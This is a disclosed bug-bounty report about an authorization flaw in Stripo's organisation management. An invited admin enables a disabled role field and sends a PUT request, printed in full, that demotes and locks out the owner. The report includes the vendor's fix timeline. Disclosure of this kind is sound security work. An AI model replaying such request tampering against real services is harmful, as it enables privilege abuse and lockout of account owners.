---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/improper-authorization
  - env/web
  - vuln/broken-access-control
  - vuln/jwt
substate: "resolved"
weakness: "Improper Authorization"
enriched: true
body: true
date: 2020-02-03
submitted: 2019-12-04T10:15:52.212Z
bounty_usd: null
votes: 20
cve: []
program: "[[programs/stripo|Stripo Inc]]"
reporter: "abdellah29"
source: "https://hackerone.com/reports/751299"
title: "Improper Authorization"
---
# Improper Authorization

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 20 | **Program:** Stripo Inc | **Disclosed:** 2020-02-03

- Report: [https://hackerone.com/reports/751299](https://hackerone.com/reports/751299)
- CWE: Improper Authorization
- Submitted: 2019-12-04T10:15:52.212Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

hi there ,

i found an vulnerability on  https://my.stripo.email/cabinet/#/users/orog_id ,

generally every user have an organisation and the organisation contain projects , 

lets suppose : test@gmail.com is the owner of the project

and test2@gmail.com was invited to his project as admin , in normal situation the owner can not be removed even if second account is admin

the issue is i can removed the owned from hi position to admin , and the big problem once the owner is removed he can not login again to his account


## Steps To Reproduce:
[add details for how we can reproduce the issue]

  1. you must have 2 account , one owner , the second got invited as admin

  2. log in with your second account and go to https://my.stripo.email/cabinet/#/users/xxxx

       you will see that the input of role is disabled , enable it via inspect element ( f12) , 

then change the role of owner for it to admin , an PUT request will be sent

##http request

PUT /cabinet/stripeapi/v1/organizations/135428/users HTTP/1.1
Host: my.stripo.email
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Authorization: Bearer null
Content-Type: application/json;charset=UTF-8
Cache-Control: no-cache
Pragma: no-cache
Expires: Sat, 01 Jan 2000 00:00:00 GMT
Content-Length: 231
Origin: https://my.stripo.email
Connection: close
Referer: https://my.stripo.email/cabinet/
Cookie: __stripe_mid=f1a62f3d-2ba4-4742-a1ae-97c309223fec; __stripe_sid=20155b5b-e547-4e52-9c4c-53fd4b08ed8a; _ga=GA1.2.472610903.1575449565; _gid=GA1.2.1705021668.1575449565; _fbp=fb.1.1575449579810.16963820; token=[REDACTED-JWT]; intercom-session-b1m243ec=Tlk4aHpydmFMOTc5SlZRaGRabE43WUIwanoxdXAyNlowR3FWbE9oaXNDRm5mYlhRRHNBNjlyLzJOOWQybmtYQi0tZzUrdnd1enBReWhPM0J3M1N2SFIzUT09--a917964bb8221fad0a6d3e38fab8cde2af1efed4

{"repository":{},"idField":"id","entityType":"USER","id":135628,"role":"admin","organizationId":135428,"firstName":"TESt","lastName":"account","color":"#cc90e2","email":"pain45@wearehackerone.com","projectIds":[],"suspended":false} 

##http response :


HTTP/1.1 200 
Server: nginx
Date: Wed, 04 Dec 2019 09:56:41 GMT
Content-Type: application/json;charset=UTF-8
Connection: close
Vary: Accept-Encoding
█████████
████
X-Frame-Options: sameorigin
Strict-Transport-Security: max-age=31536000; includeSubDomains
Content-Length: 180

█████cc90e2","email":"pain45@wearehackerone.com","projectIds":[],"suspended":false}

i hope it is clear , 

thanks

## Impact

an attacker ( already admin ) can remove the owner from his role , and the last one can not login any more to his account

## Timeline

- **Report Filed**
- **Report Triaged**
- **2019-12-24** @abdellah29: hi there artem  , any update about this issue ?

regard ,

nadi
- **2020-01-08** @artem_nefedov: Hello @pain45 

Thanks for checking.

This is already solved and is in the queue to be released soon. We expect to close this report as solved one before the 15th of January.
- **Report Severity Updated**
- **2020-01-24** @abdellah29: hi @artem_nefedov  any update ?
- **2020-01-27** @artem_nefedov: @pain45 the release has delayed, planning at the end of this week.
- **Report Resolved**
- **2020-01-31** @abdellah29: hi @artem_nefedov thanks for the response , i'll try to find more vulnerabilities and send you more report in the next few days

kind regard,

Nadi
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
